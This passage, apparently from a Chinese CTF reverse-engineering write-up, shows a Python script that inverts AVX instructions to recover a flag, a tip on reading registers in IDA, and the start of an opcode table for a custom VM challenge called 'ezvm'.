ymm2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xff\x83\xf3\xdf\xec\x00\x8e\x92&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;OL&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x97&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;O&amp;#39;D&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x7f\xa4\xe3&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;N&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xbf&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xdd&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;*T&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc3&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb2\x82&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;q&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa0\x1b\xf5&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
ymm3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb4\xc7&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;lj&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xfb\x1f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;p&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xf5&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc9\r\x1b\xb4\xe5\xff&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;EN^&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x95&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xef\x8e&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;@&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x8d\x9a\xf9\xd1\x92\x8b\xbf&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xbb&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
ymm4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xca&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}6&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xf7\xc5\xcb\x90\xb9&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;B&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x96\xe0\xa5&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;5sL&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xf7\xa9\x9d\x87\xa1\xc2&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x8b\xe8\x9a&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe6&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x04\xd1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
ymm5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;)&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x9d\x0b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Gy&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x1a\xa4\x97\x02\xbf\x13\x9e\xa0\xd2\xa4&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;m?_=M4&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xea\xee&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Ra&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x97&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;e&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb4\x04\x91\xd8&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;W&amp;#39;&lt;/span&gt;
ymm6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00\x01\x08\t\n\x02\x03\x04\x05\x0c\r\x0e\x06\x07\x0b\x0f\x00\x06\x07\x08\t\n\x02\x03\x04\x05\r\x0e\x0b\x0c\x01\x0f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
ymm7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00\x06\x00\x00\x00\x07\x00\x00\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rev_vpermd&lt;/span&gt;(x, y):
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    origin:
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        from: b&amp;#34;3_bh&amp;#34; b&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa8\xff\x8f\x99\xa7\x94\x9e\x9a&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)4&amp;#34; b&amp;#34;&amp;#39;6&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd6\x82\xc2&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe8\xaa&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; b&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x96&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Je&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc0\x0c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x19\xc9&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        to  : b&amp;#34;3_bh&amp;#34; b&amp;#34;&amp;#39;6&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd6\x82\xc2&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe8\xaa&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; b&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa8\xff\x8f\x99\xa7\x94\x9e\x9a&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)4&amp;#34; b&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x96&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Je&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc0\x0c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x19\xc9&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    &amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; y[:&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; y[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; y[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; y[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;:]

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rev_vpxor&lt;/span&gt;(x, y):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; bytes([a &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; b &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; a, b &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; zip(x, y)])

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rev_vpaddb&lt;/span&gt;(x, y):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; bytes([(a &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; b) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; a, b &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; zip(x, y)])

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rev_vpsubb&lt;/span&gt;(x, y):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; bytes([(a &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; b) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; a, b &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; zip(x, y)])

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rev_vpshufb&lt;/span&gt;(x, y):
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    origin:
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        from: b&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x89\xa1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; b&amp;#39;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc0\xe5\x14&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc5&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x14\xb0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x1f\xe8&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xf5\xb0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;4&amp;#39; &amp;#39;6&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc2\xc7\xa0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb2&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;^~&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x9c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa4\x98&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe8&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;T&amp;#39; &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x0b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        to  : b&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x89\xa1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; b&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x14\xb0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc0\xe5\x14&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x1f\xe8&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc5&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xf5\xb0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb2&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;^~&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x9c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;6&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc2\xc7\xa0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe8&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;T&amp;#39; &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xa4\x98&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;4&amp;#39; &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x0b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    &amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; x[:&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; x[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; x[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; x[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; x[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; x[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; x[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; x[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; x[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; x[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; x[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; x[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; x[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;:]

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; asm&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)[::&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]:
    b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;replace(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split()
    exec(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;b[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; = rev_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;b[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;b[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;, &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;b[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)&amp;#39;&lt;/span&gt;)
print (ymm0)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;ida 动调的时候要知道寄存器的值，可以用 idapython 的 &lt;code&gt;get_reg_value(&amp;quot;ymm0&amp;quot;)&lt;/code&gt;
指令不知道什么意思的话动调看一下变化就行&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;reezvm&#34;&gt;[RE]ezvm&lt;/h3&gt;
&lt;p&gt;把几个指令整理一下&lt;/p&gt;
&lt;p&gt;能够看出特定用途的几个寄存器：&lt;/p&gt;
&lt;p&gt;[8]: ZF 相等为 0，大于为 1，小于为 -1
[9]: stack
[9 + 100]: code
[9 + 200]: data&lt;/p&gt;
&lt;p&gt;其他的应该都是 rax 之类的&lt;/p&gt;
&lt;p&gt;总结的几个指令：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;op&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;disasm&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;mov r3, r2&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;1&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;inc r2&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;2&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;dec r2&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;3&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;xor r3, r7&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;4&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;push r3&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;5&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;push r5&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;6&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;push r6&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;7&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;pop r3&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;8&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;pop r5&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;9&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;pop r6&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;10&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;pop r2&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;11&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;pop r7&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;12&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;jz $+1+r6&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;13&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;jnz $+1+r6&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;14&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;jmp $+1+r2&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;15&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;cmp r3, r5&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;16&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;getchar(r3)&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;17&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;putchar(r3)&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;18&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;push *((r4++)+0xD1)&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;19&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;mov r3, [rbp+r2]&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
